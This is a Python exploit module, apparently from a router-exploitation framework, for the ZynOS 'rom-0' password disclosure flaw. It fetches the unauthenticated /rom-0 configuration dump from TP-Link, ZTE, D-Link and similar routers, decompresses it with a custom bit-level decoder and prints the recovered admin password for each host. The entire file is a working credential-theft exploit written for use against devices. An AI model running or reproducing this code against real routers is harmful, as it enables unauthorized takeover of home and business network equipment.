#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: 'arvin'
import collections
import requests
import utils
from template.exploit import BaseExploit


class Exploit(BaseExploit):
    __info__ = {
        'name': 'Zynos rom-0 Password Disclosure',
        'description': 'Routers based on Zynos has a no auth required web page /rom-0, '
                       'which will leak the admin password',
        'reference': [
            'https://packetstormsecurity.com/files/127049/'
            'ZTE-TP-Link-ZynOS-Huawei-rom-0-Configuration-Decompressor.html']
    }
    prompt = 'rom-0'

    def __init__(self):
        super().__init__()
        self.s = requests.Session()

    def check(self, host, port, timeout):
        content_type = 'application/octet-stream'
        try:
            resp = self.s.get('http://{}:{}/rom-0'.format(host, port), timeout=timeout, stream=True)
        except requests.RequestException as err:
            self.print_requests_err(host, port, err)
            return False
        else:
            if resp.status_code == requests.codes.ok and resp.headers.get('Content-Type') == content_type:
                self.print_check_result(True, host)
                return True
            else:
                self.print_check_result(False, host)
                return False
        finally:
            self.s.close()

    def run(self, host, port, timeout):
        content_type = 'application/octet-stream'
        try:
            resp = self.s.get('http://{}:{}/rom-0'.format(host, port), timeout=timeout, stream=True)
        except requests.RequestException as err:
            self.print_requests_err(host, port, err)
            return False
        else:
            if resp.status_code == requests.codes.ok and resp.headers.get('Content-Type') == content_type:
                with open('rom-0', 'wb+') as f:
                    for chunk in resp.iter_content(1024):
                        f.write(chunk)
                    self.s.close()
                    utils.print_info('Opening rom-0 file')
                    fpos = 8568
                    fend = 8788
                    f.seek(fpos)
                    amount = 221
                    while fpos < fend:
                        if fend - fpos < amount:
                            amount = amount
                            data = f.read(amount)
                            fpos += len(data)

                    reader = BitReader(data)
                    result = ''

                    window = RingList(2048)

                    while True:
                        bit = reader.getBit()
                        if not bit:
                            char = reader.getByte()
                            result += chr(char)
                            window.append(char)
                        else:
                            bit = reader.getBit()
                            if bit:
                                offset = reader.getBits(7)
                                if offset == 0:
                                    break
                            else:
                                offset = reader.getBits(11)

                            len_field = reader.getBits(2)
                            if len_field < 3:
                                lenght = len_field + 2
                            else:
                                len_field <<= 2
                                len_field += reader.getBits(2)
                                if len_field < 15:
                                    lenght = (len_field & 0x0f) + 5
                                else:
                                    len_counter = 0
                                    len_field = reader.getBits(4)
                                    while len_field == 15:
                                        len_field = reader.getBits(4)
                                        len_counter += 1
                                    lenght = 15 * len_counter + 8 + len_field

                            for i in range(lenght):
                                char = window[-offset]
                                result += chr(char)
                                window.append(char)

                    def filter_non_printable(str):
                        return ''.join([c for c in str if ord(c) > 31 or ord(c) == 9])

                    # def regex(path, text):
                    #     match = re.search(path, text)
                    #     if match:
                    #         return match.group()
                    #     else:
                    #         return None

                    result = filter_non_printable(result).encode('ascii', 'ignore').decode('ascii')
                    utils.print_info('Filtered Strings: {0}'.format(result))

                    if 'TP-LINK' in result:
                        result = ''.join(result.split()).split('TP-LINK', 1)[0] + 'TP-LINK'
                        result = result.replace("TP-LINK", "")
                        result = result[1:]

                    if 'ZTE' in result:
                        result = ''.join(result.split()).split('ZTE', 1)[0] + 'ZTE'
                        result = result.replace("ZTE", "")
                        result = result[1:]

                    if 'D-Link' in result:
                        result = ''.join(result.split()).split('D-Link', 1)[0] + 'D-Link'
                        result = result.replace("D-Link", "")
                        result = result[1:]

                    if 'tc160' in result:
                        result = ''.join(result.split()).split('tc160', 1)[0] + 'tc160'
                        result = result.replace("tc160", "")
                        result = result[1:]

                    utils.print_success('Router:{} Password is: {}'.format(host, result))

            else:
                self.print_check_result(False, host)
                return False


class BitReader:
    def __init__(self, bytes):
        self._bits = collections.deque()

        for byte in bytes:
            for n in range(8):
                self._bits.append(bool((byte >> (7 - n)) & 1))

    def getBit(self):
        return self._bits.popleft()

    def getBits(self, num):
        res = 0
        for i in range(num):
            res += self.getBit() << num - 1 - i
        return res

    def getByte(self):
        return self.getBits(8)

    @property
    def __len__(self):
        return len(self._bits)


class RingList:
    def __init__(self, length):
        self.__data__ = collections.deque()
        self.__full__ = False
        self.__max__ = length

    def append(self, x):
        if self.__full__:
            self.__data__.popleft()
        self.__data__.append(x)
        if self.size() == self.__max__:
            self.__full__ = True

    def get(self):
        return self.__data__

    def size(self):
        return len(self.__data__)

    def maxsize(self):
        return self.__max__

    def __getitem__(self, n):
        if n >= self.size():
            return None
        return self.__data__[n]
